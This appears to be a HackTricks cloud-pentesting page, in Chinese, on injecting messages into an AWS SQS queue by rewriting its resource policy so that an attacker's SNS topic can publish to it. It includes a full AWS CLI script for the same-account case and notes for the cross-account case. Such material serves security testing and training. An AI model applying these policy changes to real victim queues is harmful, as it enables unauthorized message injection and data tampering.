# AWS – 通过 SNS 订阅 + 队列策略 对 SQS 实现 跨/同 账户 注入

{{#include ../../../../banners/hacktricks-training.md}}

## 描述

滥用 SQS 队列资源策略，使攻击者控制的 SNS 主题能够向受害者的 SQS 队列发布消息。在同一账户内，SQS 对 SNS 主题的订阅会自动确认；在跨账户场景下，必须从队列中读取 SubscriptionConfirmation token 并调用 ConfirmSubscription。这样可以实现不可靠的消息注入，下游消费者可能会错误地信任这些消息。

### 要求
- 能够修改目标 SQS 队列的资源策略：在受害者队列上具有 `sqs:SetQueueAttributes` 权限。
- 能够在攻击者控制下创建/发布到 SNS 主题：在攻击者账户/主题上具有 `sns:CreateTopic`、`sns:Publish` 和 `sns:Subscribe` 权限。
- 仅跨账户：在受害者队列上临时拥有 `sqs:ReceiveMessage`，以读取确认令牌并调用 `sns:ConfirmSubscription`。

### 同账户 利用
```bash
REGION=us-east-1
# 1) Create victim queue and capture URL/ARN
Q_URL=$(aws sqs create-queue --queue-name ht-victim-q --region $REGION --query QueueUrl --output text)
Q_ARN=$(aws sqs get-queue-attributes --queue-url "$Q_URL" --region $REGION --attribute-names QueueArn --query Attributes.QueueArn --output text)

# 2) Create attacker SNS topic
TOPIC_ARN=$(aws sns create-topic --name ht-attacker-topic --region $REGION --query TopicArn --output text)

# 3) Allow that SNS topic to publish to the queue (queue resource policy)
cat > /tmp/ht-sqs-sns-policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AllowSNSTopicPublish","Effect":"Allow","Principal":{"Service":"sns.amazonaws.com"},"Action":"SQS:SendMessage","Resource":"REPLACE_QUEUE_ARN","Condition":{"StringEquals":{"aws:SourceArn":"REPLACE_TOPIC_ARN"}}}]}
JSON
sed -i.bak "s#REPLACE_QUEUE_ARN#$Q_ARN#g; s#REPLACE_TOPIC_ARN#$TOPIC_ARN#g" /tmp/ht-sqs-sns-policy.json
# Provide the attribute as a JSON map so quoting works reliably
cat > /tmp/ht-attrs.json <<JSON
{
"Policy": "REPLACE_POLICY_JSON"
}
JSON
# Embed the policy file contents as a JSON string
POL_ESC=$(jq -Rs . /tmp/ht-sqs-sns-policy.json)
sed -i.bak "s#\"REPLACE_POLICY_JSON\"#$POL_ESC#g" /tmp/ht-attrs.json
aws sqs set-queue-attributes --queue-url "$Q_URL" --region $REGION --attributes file:///tmp/ht-attrs.json

# 4) Subscribe the queue to the topic (auto-confirms same-account)
aws sns subscribe --topic-arn "$TOPIC_ARN" --protocol sqs --notification-endpoint "$Q_ARN" --region $REGION

# 5) Publish and verify injection
aws sns publish --topic-arn "$TOPIC_ARN" --message {pwn:sns->sqs} --region $REGION
aws sqs receive-message --queue-url "$Q_URL" --region $REGION --max-number-of-messages 1 --wait-time-seconds 10 --attribute-names All --message-attribute-names All
```
### 跨账户 注意事项
- 上面的队列策略必须允许外部的 `TOPIC_ARN`（攻击者账户）。
- 订阅不会自动确认。授予自己针对受害者队列的临时 `sqs:ReceiveMessage` 权限，以读取 `SubscriptionConfirmation` 消息，然后使用其 `Token` 调用 `sns confirm-subscription`。

### 影响
**潜在影响**: 通过 SNS 持续向受信任的 SQS 队列注入未经请求的消息，可能触发意外的处理、数据污染或工作流滥用。

{{#include ../../../../banners/hacktricks-training.md}}
